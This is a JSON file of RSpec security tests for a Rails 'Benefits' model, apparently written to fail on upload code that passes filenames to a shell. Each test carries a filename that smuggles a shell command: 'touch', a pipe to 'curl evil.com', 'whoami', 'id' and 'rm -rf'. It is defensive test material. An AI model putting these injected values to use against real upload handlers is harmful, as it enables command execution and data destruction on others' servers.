{
  "redTests": [
    {
      "testName": "command injection via semicolon in filename",
      "testCode": "require 'rails_helper'\n\nRSpec.describe Benefits, type: :model do\n  it 'prevents command injection via semicolon' do\n    file = double('file', original_filename: 'test.txt; touch /tmp/pwned', read: 'data')\n    allow(File).to receive(:open).and_yield(double(write: nil, close: nil))\n    allow(File).to receive(:exist?).and_return(true)\n    expect(File).to receive(:exist?).with('/tmp/pwned').and_return(false)\n    Benefits.save(file, 'true')\n    expect(File.exist?('/tmp/pwned')).to be false\n  end\nend",
      "attackVector": "test.txt; touch /tmp/pwned",
      "expectedBehavior": "should_fail_on_vulnerable_code"
    },
    {
      "testName": "command injection via pipe in filename",
      "testCode": "require 'rails_helper'\n\nRSpec.describe Benefits, type: :model do\n  it 'prevents command injection via pipe' do\n    file = double('file', original_filename: 'test.txt | curl evil.com', read: 'data')\n    allow(File).to receive(:open).and_yield(double(write: nil, close: nil))\n    allow(File).to receive(:exist?).and_return(true)\n    expect { Benefits.save(file, 'true') }.not_to change { `ps aux | grep curl | grep -v grep`.empty? }.from(true)\n  end\nend",
      "attackVector": "test.txt | curl evil.com",
      "expectedBehavior": "should_fail_on_vulnerable_code"
    },
    {
      "testName": "command injection via backticks in filename",
      "testCode": "require 'rails_helper'\n\nRSpec.describe Benefits, type: :model do\n  it 'prevents command injection via backticks' do\n    file = double('file', original_filename: 'test`whoami`.txt', read: 'data')\n    allow(File).to receive(:open).and_yield(double(write: nil, close: nil))\n    allow(File).to receive(:exist?).and_return(true)\n    expect(Benefits).to receive(:system).with(/test`whoami`.txt/).and_call_original\n    expect { Benefits.save(file, 'true') }.to raise_error\n  end\nend",
      "attackVector": "test`whoami`.txt",
      "expectedBehavior": "should_fail_on_vulnerable_code"
    },
    {
      "testName": "command injection via dollar parentheses in filename",
      "testCode": "require 'rails_helper'\n\nRSpec.describe Benefits, type: :model do\n  it 'prevents command injection via dollar parentheses' do\n    file = double('file', original_filename: 'test$(id).txt', read: 'data')\n    allow(File).to receive(:open).and_yield(double(write: nil, close: nil))\n    allow(File).to receive(:exist?).and_return(true)\n    expect(Benefits).to receive(:system).with(/test\\$\\(id\\).txt/)\n    Benefits.save(file, 'true')\n  end\nend",
      "attackVector": "test$(id).txt",
      "expectedBehavior": "should_fail_on_vulnerable_code"
    },
    {
      "testName": "command injection via ampersand in filename",
      "testCode": "require 'rails_helper'\n\nRSpec.describe Benefits, type: :model do\n  it 'prevents command injection via ampersand' do\n    file = double('file', original_filename: 'test.txt & rm -rf /tmp/testdir &', read: 'data')\n    allow(File).to receive(:open).and_yield(double(write: nil, close: nil))\n    allow(File).to receive(:exist?).and_return(true)\n    FileUtils.mkdir_p('/tmp/testdir')\n    Benefits.save(file, 'true')\n    expect(File.exist?('/tmp/testdir')).to be true\n  end\nend",
      "attackVector": "test.txt & rm -rf /tmp/testdir &",
      "expectedBehavior": "should_fail_on_vulnerable_code"
    }
  ]
}